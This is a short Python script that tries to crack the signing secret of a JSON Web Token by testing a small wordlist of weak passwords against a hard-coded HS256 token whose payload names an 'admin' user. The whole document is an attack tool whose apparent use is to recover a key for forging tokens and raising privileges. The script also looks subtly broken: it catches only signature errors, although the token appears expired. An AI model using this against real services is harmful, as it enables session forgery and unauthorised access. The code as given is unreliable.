import jwt

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InVzZXIiLCJleHAiOjE3Mjc0NDg4ODN9.b31vxWAlo2ZwEbiNCKe15JIs4OWY5lGE_ddf1i7vOz0"
wordlist = ["secret", "password", "supersecretkey", "123456"]

for secret in wordlist:
    try:
        decoded = jwt.decode(token, secret, algorithms=['HS256'])
        print(f"Secret found: {secret}")
        break
    except jwt.InvalidSignatureError:
        continue
